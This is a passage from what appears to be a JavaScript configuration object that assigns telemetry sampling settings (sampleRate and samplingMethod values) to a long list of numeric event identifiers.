                        "426382631": {sampleRate: 1, samplingMethod: 1},
                        "426385027": {sampleRate: 1, samplingMethod: 1},
                        "426389483": {sampleRate: 1, samplingMethod: 1},
                        "430374913": {sampleRate: 1, samplingMethod: 1},
                        "430378067": {sampleRate: 1, samplingMethod: 1},
                        "430383451": {sampleRate: 1, samplingMethod: 1},
                        "430386496": {sampleRate: 1, samplingMethod: 1},
                        "430390878": {sampleRate: 1, samplingMethod: 1},
                        "430391177": {sampleRate: 1, samplingMethod: 1},
                        "431626192": {sampleRate: 1, samplingMethod: 1},
                        "431626709": {sampleRate: 1, samplingMethod: 1},
                        "431630887": {sampleRate: 10, samplingMethod: 1},
                        "432676234": {sampleRate: 1, samplingMethod: 1},
                        "432677504": {sampleRate: 1, samplingMethod: 1},
                        "432679263": {sampleRate: 1, samplingMethod: 1},
                        "432682775": {sampleRate: 1, samplingMethod: 1},
                        "432683819": {sampleRate: 1, samplingMethod: 1},
                        "435684623": {sampleRate: 100, samplingMethod: 1},
                        "435684729": {sampleRate: 100, samplingMethod: 1},
                        "435684741": {sampleRate: 100, samplingMethod: 1},
                        "435684980": {sampleRate: 100, samplingMethod: 1},
                        "435685229": {sampleRate: 100, samplingMethod: 1},
                        "435685848": {sampleRate: 100, samplingMethod: 1},
                        "435685921": {sampleRate: 100, samplingMethod: 1},
                        "435686268": {sampleRate: 100, samplingMethod: 1},
                        "435687015": {sampleRate: 100, samplingMethod: 1},
                        "435687513": {sampleRate: 100, samplingMethod: 1},
                        "435687530": {sampleRate: 100, samplingMethod: 1},
                        "435687537": {sampleRate: 100, samplingMethod: 1},
                        "435687801": {sampleRate: 100, samplingMethod: 1},
                        "435688416": {sampleRate: 100, samplingMethod: 1},
                        "435688603": {sampleRate: 100, samplingMethod: 1},
                        "435688620": {sampleRate: 100, samplingMethod: 1},
                        "435689044": {sampleRate: 100, samplingMethod: 1},
                        "435689085": {sampleRate: 100, samplingMethod: 1},
                        "435689154": {sampleRate: 100, samplingMethod: 1},
                        "435689259": {sampleRate: 100, samplingMethod: 1},
                        "435689828": {sampleRate: 100, samplingMethod: 1},
                        "435689899": {sampleRate: 100, samplingMethod: 1},
                        "435690518": {sampleRate: 100, samplingMethod: 1},
                        "435691376": {sampleRate: 100, samplingMethod: 1},
                        "435691707": {sampleRate: 100, samplingMethod: 1},
                        "435691902": {sampleRate: 100, samplingMethod: 1},
                        "435691955": {sampleRate: 100, samplingMethod: 1},
                        "435692102": {sampleRate: 100, samplingMethod: 1},
                        "435692121": {sampleRate: 100, samplingMethod: 1},
                        "435692864": {sampleRate: 100, samplingMethod: 1},
                        "435692975": {sampleRate: 100, samplingMethod: 1},
                        "435693002": {sampleRate: 100, samplingMethod: 1},
                        "435693404": {sampleRate: 100, samplingMethod: 1},
                        "435693600": {sampleRate: 100, samplingMethod: 1},
                        "435693854": {sampleRate: 100, samplingMethod: 1},
                        "435694384": {sampleRate: 100, samplingMethod: 1},
                        "435694627": {sampleRate: 100, samplingMethod: 1},
                        "435694927": {sampleRate: 100, samplingMethod: 1},
                        "435694934": {sampleRate: 100, samplingMethod: 1},
                        "435696304": {sampleRate: 100, samplingMethod: 1},
                        "435696437": {sampleRate: 100, samplingMethod: 1},
                        "435696473": {sampleRate: 1, samplingMethod: 1},
                        "435696804": {sampleRate: 100, samplingMethod: 1},
                        "435696833": {sampleRate: 100, samplingMethod: 1},
                        "435697072": {sampleRate: 100, samplingMethod: 1},
                        "435697446": {sampleRate: 100, samplingMethod: 1},
                        "435697886": {sampleRate: 100, samplingMethod: 1},
                        "435698374": {sampleRate: 100, samplingMethod: 1},
                        "435698646": {sampleRate: 100, samplingMethod: 1},
                        "435699123": {sampleRate: 100, samplingMethod: 1},
                        "435699279": {sampleRate: 100, samplingMethod: 1},
                        "440275195": {sampleRate: 1, samplingMethod: 1},
                        "445974335": {sampleRate: 1, samplingMethod: 1},
                        "445974949": {sampleRate: 1, samplingMethod: 1},
                        "445975283": {sampleRate: 1, samplingMethod: 1},
                        "445975837": {sampleRate: 1, samplingMethod: 1},
                        "445975868": {sampleRate: 1, samplingMethod: 1},
                        "445975872": {sampleRate: 1, samplingMethod: 1},
                        "445976139": {sampleRate: 1, samplingMethod: 1},
                        "445976232": {sampleRate: 1, samplingMethod: 1},
                        "445976360": {sampleRate: 1, samplingMethod: 1},
                        "445977086": {sampleRate: 1, samplingMethod: 1},
                        "445977677": {sampleRate: 1, samplingMethod: 1},
                        "445977908": {sampleRate: 1, samplingMethod: 1},
                        "445978739": {sampleRate: 1, samplingMethod: 1},
                        "445979308": {sampleRate: 1, samplingMethod: 1},
                        "445981478": {sampleRate: 1, samplingMethod: 1},
                        "445981521": {sampleRate: 1, samplingMethod: 1},
                        "445981651": {sampleRate: 1, samplingMethod: 1},
                        "445981782": {sampleRate: 1, samplingMethod: 1},
                        "445982501": {sampleRate: 1, samplingMethod: 1},
                        "445982831": {sampleRate: 1, samplingMethod: 1},
                        "445983197": {sampleRate: 1, samplingMethod: 1},
                        "445983323": {sampleRate: 1, samplingMethod: 1},
                        "445983810": {sampleRate: 1, samplingMethod: 1},
                        "445983882": {sampleRate: 1, samplingMethod: 1},
                        "445984313": {sampleRate: 1, samplingMethod: 1},
                        "445984511": {sampleRate: 1, samplingMethod: 1},
                        "445984703": {sampleRate: 1, samplingMethod: 1},
                        "445984855": {sampleRate: 1, samplingMethod: 1},
                        "445985856": {sampleRate: 1, samplingMethod: 1},
                        "445986130": {sampleRate: 1, samplingMethod: 1},
                        "445986133": {sampleRate: 1, samplingMethod: 1},
                        "445986387": {sampleRate: 1, samplingMethod: 1},
                        "445987236": {sampleRate: 1, samplingMethod: 1},
                        "445987822": {sampleRate: 1, samplingMethod: 1},
                        "445988450": {sampleRate: 1, samplingMethod: 1},
                        "445988500": {sampleRate: 1, samplingMethod: 1},
                        "445988600": {sampleRate: 1, samplingMethod: 1},
                        "448137847": {sampleRate: 1, samplingMethod: 1},
                        "448137862": {sampleRate: 1, samplingMethod: 1},
                        "459277372": {sampleRate: 1, samplingMethod: 1},
                        "459279083": {sampleRate: 1, samplingMethod: 1},
                        "459280844": {sampleRate: 1, samplingMethod: 1},
                        "459283386": {sampleRate: 1, samplingMethod: 1},
                        "459283488": {sampleRate: 1, samplingMethod: 1},
                        "459285749": {sampleRate: 1, samplingMethod: 1},
                        "459288505": {sampleRate: 1, samplingMethod: 1},
                        "459291249": {sampleRate: 1, samplingMethod: 1},
                        "459292159": {sampleRate: 1, samplingMethod: 1},
                        "459292291": {sampleRate: 1, samplingMethod: 1},
                        "460468818": {sampleRate: 1, samplingMethod: 1},
                        "463013863": {sampleRate: 10, samplingMethod: 1},
                        "463014635": {sampleRate: 1, samplingMethod: 1},
                        "463015185": {sampleRate: 10, samplingMethod: 1},
                        "463015362": {sampleRate: 1, samplingMethod: 1},
                        "463015568": {sampleRate: 1, samplingMethod: 1},
                        "463016139": {sampleRate: 1, samplingMethod: 1},
                        "463016165": {sampleRate: 1, samplingMethod: 1},
                        "463016390": {sampleRate: 1, samplingMethod: 1},
                        "463016713": {sampleRate: 10, samplingMethod: 1},
                        "463016767": {sampleRate: 1, samplingMethod: 1},
                        "463017657": {sampleRate: 1, samplingMethod: 1},
                        "463017909": {sampleRate: 1, samplingMethod: 1},
                        "463018037": {sampleRate: 1, samplingMethod: 1},
                        "463018218": {sampleRate: 1, samplingMethod: 1},
                        "463018233": {sampleRate: 10, samplingMethod: 1},
                        "463018876": {sampleRate: 1, samplingMethod: 1},
                        "463018912": {sampleRate: 10, samplingMethod: 1},
                        "463018943": {sampleRate: 1, samplingMethod: 1},
                        "463019567": {sampleRate: 1, samplingMethod: 1},
                        "463019600": {sampleRate: 1, samplingMethod: 1},
                        "463019974": {sampleRate: 10, samplingMethod: 1},
                        "463020161": {sampleRate: 10, samplingMethod: 1},
                        "463020393": {sampleRate: 1, samplingMethod: 1},
                        "463020766": {sampleRate: 1, samplingMethod: 1},
                        "463021213": {sampleRate: 1, samplingMethod: 1},
                        "463021269": {sampleRate: 1, samplingMethod: 1},
                        "463021570": {sampleRate: 10, samplingMethod: 1},
                        "463021813": {sampleRate: 1, samplingMethod: 1},
                        "463022004": {sampleRate: 1, samplingMethod: 1},
                        "463022130": {sampleRate: 10, samplingMethod: 1},
                        "463022146": {sampleRate: 10, samplingMethod: 1},
                        "463022516": {sampleRate: 10, samplingMethod: 1},
                        "463022924": {sampleRate: 1, samplingMethod: 1},
                        "463023032": {sampleRate: 10, samplingMethod: 1},
                        "463023080": {sampleRate: 1, samplingMethod: 1},
                        "463023725": {sampleRate: 1, samplingMethod: 1},
                        "463024020": {sampleRate: 1, samplingMethod: 1},
                        "463024072": {sampleRate: 10, samplingMethod: 1},
                        "463024364": {sampleRate: 1, samplingMethod: 1},
                        "463024522": {sampleRate: 10, samplingMethod: 1},
                        "463024556": {sampleRate: 1, samplingMethod: 1},
                        "463024597": {sampleRate: 1, samplingMethod: 1},
                        "463025126": {sampleRate: 1, samplingMethod: 1},
                        "463025650": {sampleRate: 1, samplingMethod: 1},
                        "463025693": {sampleRate: 1, samplingMethod: 1},
                        "463026040": {sampleRate: 1, samplingMethod: 1},
                        "463026246": {sampleRate: 10, samplingMethod: 1},
                        "463027530": {sampleRate: 10, samplingMethod: 1},
                        "469633012": {sampleRate: 1, samplingMethod: 1},
                        "469637892": {sampleRate: 1, samplingMethod: 1},
                        "469638517": {sampleRate: 1, samplingMethod: 1},
                        "469639633": {sampleRate: 1, samplingMethod: 1},
                        "469641443": {sampleRate: 1, samplingMethod: 1},
                        "469643296": {sampleRate: 1, samplingMethod: 1},
                        "478093416": {sampleRate: 1, samplingMethod: 1},
                        "478093695": {sampleRate: 1, samplingMethod: 1},
                        "478347265": {sampleRate: 10000, samplingMethod: 1},
                        "480908390": {sampleRate: 10000, samplingMethod: 1},
                        "480910975": {sampleRate: 10000, samplingMethod: 1},
                        "480913460": {sampleRate: 10000, samplingMethod: 1},
                        "480914164": {sampleRate: 10000, samplingMethod: 1},
                        "480916396": {sampleRate: 10000, samplingMethod: 1},
                        "484841970": {sampleRate: 10000, samplingMethod: 1},
                        "484905239": {sampleRate: 10, samplingMethod: 1},
                        "491135209": {sampleRate: 1, samplingMethod: 1},
                        "491143074": {sampleRate: 1, samplingMethod: 1},
                        "508365154": {sampleRate: 1, samplingMethod: 1},
                        "508368187": {sampleRate: 1, samplingMethod: 1},
                        "508369126": {sampleRate: 1, samplingMethod: 1},
                        "508374554": {sampleRate: 1, samplingMethod: 1},
                        "516228586": {sampleRate: 1, samplingMethod: 1},
                        "516228710": {sampleRate: 1, samplingMethod: 1},
                        "516229001": {sampleRate: 1, samplingMethod: 1},
                        "516231801": {sampleRate: 1, samplingMethod: 1},
                        "516233522": {sampleRate: 1, samplingMethod: 1},
                        "516233736": {sampleRate: 1, samplingMethod: 1},
                        "516234127": {sampleRate: 1, samplingMethod: 1},
                        "516234250": {sampleRate: 1, samplingMethod: 1},
                        "516234458": {sampleRate: 1, samplingMethod: 1},
                        "516234851": {sampleRate: 1, samplingMethod: 1},
                        "516234913": {sampleRate: 1, samplingMethod: 1},
                        "516234920": {sampleRate: 1, samplingMethod: 1},
                        "516234962": {sampleRate: 1, samplingMethod: 1},
                        "516236532": {sampleRate: 1, samplingMethod: 1},
                        "516237107": {sampleRate: 1, samplingMethod: 1},
                        "516237754": {sampleRate: 1, samplingMethod: 1},
                        "516239376": {sampleRate: 1, samplingMethod: 1},
                        "516239513": {sampleRate: 1, samplingMethod: 1},
                        "516242024": {sampleRate: 1, samplingMethod: 1},
                        "517542031": {sampleRate: 1, samplingMethod: 1},
                        "517544033": {sampleRate: 1, samplingMethod: 1},
                        "517544500": {sampleRate: 1, samplingMethod: 1},
                        "517551506": {sampleRate: 1, samplingMethod: 1},
                        "520225911": {sampleRate: 1, samplingMethod: 3},
                        "520226562": {sampleRate: 1, samplingMethod: 3},
                        "520226803": {sampleRate: 1, samplingMethod: 3},
                        "520226859": {sampleRate: 1, samplingMethod: 3},
                        "520227779": {sampleRate: 1, samplingMethod: 3},
                        "520229252": {sampleRate: 10000, samplingMethod: 1},
                        "520231860": {sampleRate: 1, samplingMethod: 3},
                        "520231903": {sampleRate: 1, samplingMethod: 3},
                        "520233760": {sampleRate: 1, samplingMethod: 3},
                        "520234221": {sampleRate: 1, samplingMethod: 3},
                        "520234245": {sampleRate: 1, samplingMethod: 3},
                        "520234918": {sampleRate: 1, samplingMethod: 3},
                        "520235197": {sampleRate: 1, samplingMethod: 3},
                        "520236691": {sampleRate: 10000, samplingMethod: 1},
                        "520239363": {sampleRate: 1, samplingMethod: 3},
                        "520240645": {sampleRate: 10000, samplingMethod: 1},
                        "526517510": {sampleRate: 1, samplingMethod: 1},
                        "526518298": {sampleRate: 1, samplingMethod: 1},
                        "526518890": {sampleRate: 1, samplingMethod: 1},
                        "526519344": {sampleRate: 1, samplingMethod: 1},
                        "526521870": {sampleRate: 1, samplingMethod: 1},
                        "526522103": {sampleRate: 1, samplingMethod: 1},
                        "526525605": {sampleRate: 1, samplingMethod: 1},
                        "526526321": {sampleRate: 1, samplingMethod: 1},
                        "526526434": {sampleRate: 1, samplingMethod: 1},
                        "526527396": {sampleRate: 1, samplingMethod: 1},
                        "526532064": {sampleRate: 1, samplingMethod: 1},
                        "526714587": {sampleRate: 10000, samplingMethod: 1},
                        "526717649": {sampleRate: 10000, samplingMethod: 1},
                        "527765249": {sampleRate: 1, samplingMethod: 1},
                        "527769459": {sampleRate: 1, samplingMethod: 1},
                        "527771788": {sampleRate: 1, samplingMethod: 1},
                        "528230786": {sampleRate: 1, samplingMethod: 1},
                        "528233608": {sampleRate: 1, samplingMethod: 1},
                        "528235747": {sampleRate: 1, samplingMethod: 1},
                        "531301737": {sampleRate: 10000, samplingMethod: 1},
                        "531312344": {sampleRate: 10000, samplingMethod: 1},
                        "532165955": {sampleRate: 1, samplingMethod: 1},
                        "532167327": {sampleRate: 1, samplingMethod: 1},
                        "532883550": {sampleRate: 1, samplingMethod: 1},
                        "532885803": {sampleRate: 1, samplingMethod: 1},
                        "532886361": {sampleRate: 1, samplingMethod: 1},
                        "532888709": {sampleRate: 1, samplingMethod: 1},
                        "534974071": {sampleRate: 1, samplingMethod: 1},
                        "534977644": {sampleRate: 1, samplingMethod: 1},
                        "534978022": {sampleRate: 1, samplingMethod: 1},
                        "534979103": {sampleRate: 1, samplingMethod: 1},
                        "534979289": {sampleRate: 1, samplingMethod: 1},
                        "534983980": {sampleRate: 1, samplingMethod: 1},
                        "534984327": {sampleRate: 1, samplingMethod: 1},
                        "538512187": {sampleRate: 1, samplingMethod: 1},
                        "538522688": {sampleRate: 1, samplingMethod: 1},
                        "538523041": {sampleRate: 1, samplingMethod: 1},
                        "539298786": {sampleRate: 1, samplingMethod: 1},
                        "542776204": {sampleRate: 1, samplingMethod: 3},
                        "542778775": {sampleRate: 1, samplingMethod: 3},
                        "542784537": {sampleRate: 1, samplingMethod: 1},
                        "543626600": {sampleRate: 1, samplingMethod: 1},
                        "543628365": {sampleRate: 1, samplingMethod: 1},
                        "544671169": {sampleRate: 1, samplingMethod: 3},
                        "544671925": {sampleRate: 1, samplingMethod: 1},
                        "544672070": {sampleRate: 1, samplingMethod: 1},
                        "544672144": {sampleRate: 1, samplingMethod: 1},
                        "544672323": {sampleRate: 1, samplingMethod: 1},
                        "544674848": {sampleRate: 1, samplingMethod: 1},
                        "544676057": {sampleRate: 1, samplingMethod: 3},
                        "544677675": {sampleRate: 1, samplingMethod: 1},
                        "544679016": {sampleRate: 1, samplingMethod: 1},
                        "544679157": {sampleRate: 1, samplingMethod: 1},
                        "544679355": {sampleRate: 1, samplingMethod: 3},
                        "544679565": {sampleRate: 1, samplingMethod: 1},
                        "544679875": {sampleRate: 1, samplingMethod: 3},
                        "544680242": {sampleRate: 1, samplingMethod: 1},
                        "544681296": {sampleRate: 1, samplingMethod: 1},
                        "544681905": {sampleRate: 1, samplingMethod: 1},
                        "544683739": {sampleRate: 1, samplingMethod: 1},
                        "544683999": {sampleRate: 1, samplingMethod: 1},
                        "544684042": {sampleRate: 1, samplingMethod: 1},
                        "553648129": {sampleRate: 1, samplingMethod: 1},
                        "553648130": {sampleRate: 1, samplingMethod: 1},
                        "553655735": {sampleRate: 1, samplingMethod: 1},
                        "558902195": {sampleRate: 1, samplingMethod: 1},
                        "558903169": {sampleRate: 1, samplingMethod: 1},
                        "558903412": {sampleRate: 1, samplingMethod: 1},
                        "558904351": {sampleRate: 1, samplingMethod: 1},
                        "558904495": {sampleRate: 1, samplingMethod: 1},
                        "558905116": {sampleRate: 1, samplingMethod: 1},
                        "559090277": {sampleRate: 1, samplingMethod: 1},
                        "559090485": {sampleRate: 1, samplingMethod: 1},
                        "559093968": {sampleRate: 1, samplingMethod: 1},
                        "559094585": {sampleRate: 1, samplingMethod: 1},
                        "559096080": {sampleRate: 1, samplingMethod: 1},
                        "559096538": {sampleRate: 1, samplingMethod: 1},
                        "559096915": {sampleRate: 1, samplingMethod: 1},
                        "559099845": {sampleRate: 1, samplingMethod: 1},
                        "559100761": {sampleRate: 1, samplingMethod: 1},
                        "559101881": {sampleRate: 1, samplingMethod: 1},
                        "559102417": {sampleRate: 1, samplingMethod: 1},
                        "572130828": {sampleRate: 1, samplingMethod: 1},
                        "572131972": {sampleRate: 1, samplingMethod: 1},
                        "572134284": {sampleRate: 1, samplingMethod: 1},
                        "572135240": {sampleRate: 1, samplingMethod: 1},
                        "572135712": {sampleRate: 1, samplingMethod: 1},
                        "572136953": {sampleRate: 1, samplingMethod: 1},
                        "572137945": {sampleRate: 1, samplingMethod: 1},
                        "572142814": {sampleRate: 1, samplingMethod: 1},
                        "572145501": {sampleRate: 1, samplingMethod: 1},
                        "573313316": {sampleRate: 1, samplingMethod: 1},
                        "573317629": {sampleRate: 1, samplingMethod: 1},
                        "573317714": {sampleRate: 1, samplingMethod: 1},
                        "573319052": {sampleRate: 1, samplingMethod: 1},
                        "573319429": {sampleRate: 1, samplingMethod: 1},
                        "573320127": {sampleRate: 1, samplingMethod: 1},
                        "573320487": {sampleRate: 1, samplingMethod: 1},
                        "573321857": {sampleRate: 1, samplingMethod: 1},
                        "573323179": {sampleRate: 1, samplingMethod: 1},
                        "573325103": {sampleRate: 1, samplingMethod: 1},
                        "578813953": {sampleRate: 10000, samplingMethod: 1},
                        "578813954": {sampleRate: 10000, samplingMethod: 1},
                        "582025217": {sampleRate: 1, samplingMethod: 1},
                        "582025218": {sampleRate: 1, samplingMethod: 1},
                        "582027575": {sampleRate: 1, samplingMethod: 1},
                        "588713587": {sampleRate: 1, samplingMethod: 1},
                        "592582133": {sampleRate: 10000, samplingMethod: 1},
                        "593299269": {sampleRate: 1, samplingMethod: 1},
                        "593299382": {sampleRate: 1, samplingMethod: 1},
                        "593301612": {sampleRate: 1, samplingMethod: 1},
                        "593302224": {sampleRate: 1, samplingMethod: 1},
                        "593303128": {sampleRate: 1, samplingMethod: 1},
                        "593303848": {sampleRate: 1, samplingMethod: 1},
                        "593304449": {sampleRate: 1, samplingMethod: 1},
                        "593305703": {sampleRate: 1, samplingMethod: 1},
                        "593306265": {sampleRate: 1, samplingMethod: 1},
                        "593307586": {sampleRate: 1, samplingMethod: 1},
                        "593307694": {sampleRate: 1, samplingMethod: 1},
                        "593309420": {sampleRate: 1, samplingMethod: 1},
                        "593310598": {sampleRate: 1, samplingMethod: 1},
                        "593311730": {sampleRate: 1, samplingMethod: 1},
                        "593313520": {sampleRate: 1, samplingMethod: 1},
                        "597497308": {sampleRate: 1, samplingMethod: 1},
                        "597498673": {sampleRate: 10000, samplingMethod: 1},
                        "597501298": {sampleRate: 10000, samplingMethod: 1},
                        "602148241": {sampleRate: 1, samplingMethod: 1},
                        "602150380": {sampleRate: 1, samplingMethod: 1},
                        "602153811": {sampleRate: 1, samplingMethod: 1},
                        "602154925": {sampleRate: 1, samplingMethod: 1},
                        "602157403": {sampleRate: 1, samplingMethod: 1},
                        "602161050": {sampleRate: 1, samplingMethod: 1},
                        "603196156": {sampleRate: 10000, samplingMethod: 1},
                        "603202213": {sampleRate: 10000, samplingMethod: 1},
                        "603202571": {sampleRate: 10000, samplingMethod: 1},
                        "612961719": {sampleRate: 1, samplingMethod: 1},
                        "612970753": {sampleRate: 1, samplingMethod: 1},
                        "612973892": {sampleRate: 1, samplingMethod: 1},
                        "624763788": {sampleRate: 1, samplingMethod: 1},
                        "624764751": {sampleRate: 1, samplingMethod: 1},
                        "625870199": {sampleRate: 1, samplingMethod: 1},
                        "625870607": {sampleRate: 1, samplingMethod: 1},
                        "625870658": {sampleRate: 1, samplingMethod: 1},
                        "625870761": {sampleRate: 1, samplingMethod: 1},
                        "625872161": {sampleRate: 1, samplingMethod: 1},
                        "625872374": {sampleRate: 1, samplingMethod: 1},
                        "625872449": {sampleRate: 1, samplingMethod: 1},
                        "625872960": {sampleRate: 1, samplingMethod: 1},
                        "625873595": {sampleRate: 1, samplingMethod: 1},
                        "625874920": {sampleRate: 1, samplingMethod: 1},
                        "625875030": {sampleRate: 1, samplingMethod: 1},
                        "625876304": {sampleRate: 1, samplingMethod: 1},
                        "625876688": {sampleRate: 1, samplingMethod: 1},
                        "625877881": {sampleRate: 1, samplingMethod: 1},
                        "625879077": {sampleRate: 1, samplingMethod: 1},
                        "625880936": {sampleRate: 1, samplingMethod: 1},
                        "625882015": {sampleRate: 1, samplingMethod: 1},
                        "625882307": {sampleRate: 1, samplingMethod: 1},
                        "625882731": {sampleRate: 1, samplingMethod: 1},
                        "625883074": {sampleRate: 1, samplingMethod: 1},
                        "625883668": {sampleRate: 1, samplingMethod: 1},
                        "625884250": {sampleRate: 1, samplingMethod: 1},
                        "625884983": {sampleRate: 1, samplingMethod: 1},
                        "634592018": {sampleRate: 1, samplingMethod: 1},
                        "640496395": {sampleRate: 1, samplingMethod: 1},
                        "641272127": {sampleRate: 1, samplingMethod: 1},
                        "641272881": {sampleRate: 1, samplingMethod: 1},
                        "641273441": {sampleRate: 1, samplingMethod: 1},
                        "641273554": {sampleRate: 1, samplingMethod: 1},
                        "641275636": {sampleRate: 1, samplingMethod: 1},
                        "641278608": {sampleRate: 1, samplingMethod: 1},
                        "641281776": {sampleRate: 1, samplingMethod: 1},
                        "641282992": {sampleRate: 1, samplingMethod: 1},
                        "641284572": {sampleRate: 1, samplingMethod: 1},
                        "642320131": {sampleRate: 1, samplingMethod: 1},
                        "642320141": {sampleRate: 1, samplingMethod: 1},
                        "642322226": {sampleRate: 1, samplingMethod: 1},
                        "642330111": {sampleRate: 1, samplingMethod: 1},
                        "642333495": {sampleRate: 1, samplingMethod: 1},
                        "642334504": {sampleRate: 1, samplingMethod: 1},
                        "642334561": {sampleRate: 1, samplingMethod: 1},
                        "649994381": {sampleRate: 10000, samplingMethod: 1},
                        "656148117": {sampleRate: 1, samplingMethod: 1},
                        "656149153": {sampleRate: 1, samplingMethod: 1},
                        "656150284": {sampleRate: 1, samplingMethod: 1},
                        "656152605": {sampleRate: 1, samplingMethod: 1},
                        "656153056": {sampleRate: 1, samplingMethod: 1},
                        "656153396": {sampleRate: 1, samplingMethod: 1},
                        "656153475": {sampleRate: 1, samplingMethod: 1},
                        "656154840": {sampleRate: 1, samplingMethod: 1},
                        "656156235": {sampleRate: 1, samplingMethod: 1},
                        "656156649": {sampleRate: 1, samplingMethod: 1},
                        "656157006": {sampleRate: 1, samplingMethod: 1},
                        "656157513": {sampleRate: 1, samplingMethod: 1},
                        "656158903": {sampleRate: 1, samplingMethod: 1},
                        "656160300": {sampleRate: 1, samplingMethod: 1},
                        "656162024": {sampleRate: 1, samplingMethod: 1},
                        "656162239": {sampleRate: 1, samplingMethod: 1},
                        "658310259": {sampleRate: 1, samplingMethod: 1},
                        "658311000": {sampleRate: 1, samplingMethod: 1},
                        "658311653": {sampleRate: 1, samplingMethod: 1},
                        "658312030": {sampleRate: 1, samplingMethod: 1},
                        "658312060": {sampleRate: 1, samplingMethod: 1},
                        "658312503": {sampleRate: 1, samplingMethod: 1},
                        "658313937": {sampleRate: 1, samplingMethod: 1},
                        "658314754": {sampleRate: 1, samplingMethod: 1},
                        "658319560": {sampleRate: 1, samplingMethod: 1},
                        "658320532": {sampleRate: 1, samplingMethod: 1},
                        "658323570": {sampleRate: 1, samplingMethod: 1},
                        "658325194": {sampleRate: 1, samplingMethod: 1},
                        "662769649": {sampleRate: 1, samplingMethod: 1},
                        "663618882": {sampleRate: 1, samplingMethod: 1},
                        "663621158": {sampleRate: 1, samplingMethod: 1},
                        "663621340": {sampleRate: 1, samplingMethod: 1},
                        "663621548": {sampleRate: 1, samplingMethod: 1},
                        "663622595": {sampleRate: 1, samplingMethod: 1},
                        "663622603": {sampleRate: 1, samplingMethod: 1},
                        "663622613": {sampleRate: 1, samplingMethod: 1},
                        "663622990": {sampleRate: 1, samplingMethod: 1},
                        "663624058": {sampleRate: 1, samplingMethod: 1},
                        "663625914": {sampleRate: 1, samplingMethod: 1},
                        "663626399": {sampleRate: 1, samplingMethod: 1},
                        "663627363": {sampleRate: 1, samplingMethod: 1},
                        "663627729": {sampleRate: 1, samplingMethod: 1},
                        "663628202": {sampleRate: 1, samplingMethod: 1},
                        "663629736": {sampleRate: 1, samplingMethod: 1},
                        "663630260": {sampleRate: 1, samplingMethod: 1},
                        "663631213": {sampleRate: 1, samplingMethod: 1},
                        "663631390": {sampleRate: 1, samplingMethod: 1},
                        "663631507": {sampleRate: 1, samplingMethod: 1},
                        "663631670": {sampleRate: 1, samplingMethod: 1},
                        "663632194": {sampleRate: 1, samplingMethod: 1},
                        "664017918": {sampleRate: 1, samplingMethod: 1},
                        "667166687": {sampleRate: 10000, samplingMethod: 1},
                        "668272330": {sampleRate: 1, samplingMethod: 1},
                        "668282222": {sampleRate: 1, samplingMethod: 1},
                        "668283633": {sampleRate: 1, samplingMethod: 3},
                        "674368495": {sampleRate: 1, samplingMethod: 1},
                        "678690817": {sampleRate: 1, samplingMethod: 1},
                        "678690818": {sampleRate: 1, samplingMethod: 1},
                        "678703920": {sampleRate: 1, samplingMethod: 1},
                        "685309953": {sampleRate: 10000, samplingMethod: 1},
                        "685309954": {sampleRate: 10000, samplingMethod: 1},
                        "685576384": {sampleRate: 1, samplingMethod: 1},
                        "685579102": {sampleRate: 10, samplingMethod: 1},
                        "688919680": {sampleRate: 10000, samplingMethod: 1},
                        "688924705": {sampleRate: 10000, samplingMethod: 1},
                        "688926599": {sampleRate: 1, samplingMethod: 1},
                        "688930365": {sampleRate: 100, samplingMethod: 1},
                        "689903304": {sampleRate: 1, samplingMethod: 1},
                        "689904686": {sampleRate: 1, samplingMethod: 1},
                        "689907311": {sampleRate: 1, samplingMethod: 1},
                        "689908443": {sampleRate: 1, samplingMethod: 1},
                        "689910058": {sampleRate: 1, samplingMethod: 1},
                        "691799027": {sampleRate: 10, samplingMethod: 1},
                        "691813192": {sampleRate: 1, samplingMethod: 1},
                        "691813340": {sampleRate: 1, samplingMethod: 1},
                        "691998369": {sampleRate: 1, samplingMethod: 1},
                        "692000793": {sampleRate: 1, samplingMethod: 1},
                        "692008145": {sampleRate: 1, samplingMethod: 1},
                        "692010481": {sampleRate: 1, samplingMethod: 1},
                        "695799416": {sampleRate: 10, samplingMethod: 1},
                        "695806386": {sampleRate: 10000, samplingMethod: 1},
                        "696780884": {sampleRate: 1, samplingMethod: 1},
                        "696782251": {sampleRate: 1, samplingMethod: 1},
                        "696782870": {sampleRate: 1, samplingMethod: 1},
                        "697373488": {sampleRate: 10000, samplingMethod: 1},
                        "706281473": {sampleRate: 1, samplingMethod: 1},
                        "716966485": {sampleRate: 1, samplingMethod: 1},
                        "716966647": {sampleRate: 1, samplingMethod: 1},
                        "716979633": {sampleRate: 1, samplingMethod: 1},
                        "719323137": {sampleRate: 1, samplingMethod: 1},
                        "719323138": {sampleRate: 1, samplingMethod: 1},
                        "719326647": {sampleRate: 1, samplingMethod: 1},
                        "719327653": {sampleRate: 1, samplingMethod: 1},
                        "719332537": {sampleRate: 1, samplingMethod: 1},
                        "719334544": {sampleRate: 1, samplingMethod: 1},
                        "719335669": {sampleRate: 1, samplingMethod: 1},
                        "719336631": {sampleRate: 1, samplingMethod: 1},
                        "719337039": {sampleRate: 1, samplingMethod: 1},
                        "719988411": {sampleRate: 1, samplingMethod: 1},
                        "725156869": {sampleRate: 1, samplingMethod: 1},
                        "725157581": {sampleRate: 1, samplingMethod: 1},
                        "725157683": {sampleRate: 1, samplingMethod: 1},
                        "725157923": {sampleRate: 1, samplingMethod: 1},
                        "725158389": {sampleRate: 1, samplingMethod: 1},
                        "725158695": {sampleRate: 1, samplingMethod: 1},
                        "725159829": {sampleRate: 1, samplingMethod: 1},
                        "725160706": {sampleRate: 1, samplingMethod: 1},
                        "725163651": {sampleRate: 1, samplingMethod: 1},
                        "725165351": {sampleRate: 1, samplingMethod: 1},
                        "725166821": {sampleRate: 1, samplingMethod: 1},
                        "725170528": {sampleRate: 1, samplingMethod: 1},
                        "725430792": {sampleRate: 10000, samplingMethod: 1},
                        "725623863": {sampleRate: 1, samplingMethod: 1},
                        "731650369": {sampleRate: 1, samplingMethod: 1},
                        "732639803": {sampleRate: 1, samplingMethod: 1},
                        "732826875": {sampleRate: 10000, samplingMethod: 1},
                        "732827560": {sampleRate: 10000, samplingMethod: 1},
                        "732832471": {sampleRate: 10000, samplingMethod: 1},
                        "732833806": {sampleRate: 10000, samplingMethod: 1},
                        "732834481": {sampleRate: 10000, samplingMethod: 1},
                        "732835137": {sampleRate: 10000, samplingMethod: 1},
                        "732835689": {sampleRate: 10000, samplingMethod: 1},
                        "732836954": {sampleRate: 10000, samplingMethod: 1},
                        "732838764": {sampleRate: 10000, samplingMethod: 1},
